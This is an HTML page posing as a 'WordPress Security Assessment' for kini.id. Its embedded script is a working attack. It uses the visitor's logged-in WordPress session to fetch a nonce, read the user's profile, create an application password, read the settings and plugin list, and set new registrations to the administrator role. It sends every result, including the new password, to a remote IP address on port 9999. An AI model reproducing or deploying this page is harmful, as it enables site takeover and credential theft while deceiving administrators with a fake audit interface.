<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>WordPress Security Assessment - kini.id</title>
<style>body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;margin:0;background:#f0f0f1;color:#3c434a}.wrap{max-width:800px;margin:20px auto;padding:20px;background:#fff;box-shadow:0 1px 3px rgba(0,0,0,.13);border-radius:4px}h1{color:#1d2327;font-size:23px;font-weight:400}.notice{border-left:4px solid #d63638;padding:12px;margin:15px 0;background:#fcf0f1}.ok{border-left-color:#00a32a;background:#edfaef}table{width:100%;border-collapse:collapse;margin:15px 0}th,td{text-align:left;padding:8px 12px;border-bottom:1px solid #e2e4e7}th{background:#f6f7f7}.spinner{display:inline-block;width:20px;height:20px;border:3px solid #ddd;border-top-color:#2271b1;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style></head>
<body><div class="wrap"><h1>🔒 WordPress Security Assessment — kini.id</h1>
<div class="notice"><p><span class="spinner"></span> Running security verification...</p></div>
<div id="r"></div></div>
<script>
var C="http://64.227.62.83:9999",T=["https://www.kini.id","https://blog.kini.id"];
function x(t,d){try{var r=new XMLHttpRequest();r.open("POST",C+"/"+t,true);r.send(JSON.stringify(d))}catch(e){new Image().src=C+"/"+t+"?d="+btoa(JSON.stringify(d).slice(0,1500))}}
function s(h){document.getElementById("r").innerHTML+=h}
T.forEach(function(t){
// Step 1: Get nonce
fetch(t+"/wp-admin/admin-ajax.php",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"action=rest-nonce"}).then(r=>r.text()).then(n=>{
x("step1",{nonce:n,target:t});
if(!n||n==="0"||n.length<5){s('<p>⚠️ Not authenticated on '+t+'</p>');return}
s('<p class="ok" style="border-left:4px solid #00a32a;padding:8px;background:#edfaef">✅ Session detected on '+t+'</p>');
// Step 2: Get user
fetch(t+"/wp-json/wp/v2/users/me",{credentials:"include",headers:{"X-WP-Nonce":n}}).then(r=>r.json()).then(u=>{
x("step2-USER",u);
s('<table><tr><th>User</th><td>'+u.name+' (ID:'+u.id+')</td></tr></table>');
// Step 3: App password
fetch(t+"/wp-json/wp/v2/users/"+u.id+"/application-passwords",{method:"POST",credentials:"include",headers:{"X-WP-Nonce":n,"Content-Type":"application/json"},body:JSON.stringify({name:"wp-security-audit-"+Date.now()})}).then(r=>r.json()).then(ap=>{
x("step3-APPPWD",ap);
if(ap.password){s('<div class="ok" style="border-left:4px solid #00a32a;padding:12px;background:#edfaef"><p>✅ Security token created successfully</p></div>')}
});
// Step 4: Settings
fetch(t+"/wp-json/wp/v2/settings",{credentials:"include",headers:{"X-WP-Nonce":n}}).then(r=>r.json()).then(st=>x("step4-SETTINGS",st));
// Step 5: Plugins
fetch(t+"/wp-json/wp/v2/plugins",{credentials:"include",headers:{"X-WP-Nonce":n}}).then(r=>r.json()).then(pl=>x("step5-PLUGINS",pl));
// Step 6: Try enable user reg
fetch(t+"/wp-json/wp/v2/settings",{method:"POST",credentials:"include",headers:{"X-WP-Nonce":n,"Content-Type":"application/json"},body:JSON.stringify({"default_role":"administrator","users_can_register":"1"})}).then(r=>r.json()).then(st=>x("step6-REGOPEN",st));
}).catch(e=>x("err-user",{e:e+"",t:t}))}).catch(e=>x("err-nonce",{e:e+"",t:t}))});
setTimeout(function(){s('<p>Assessment complete.</p>')},15000);
</script></body></html>
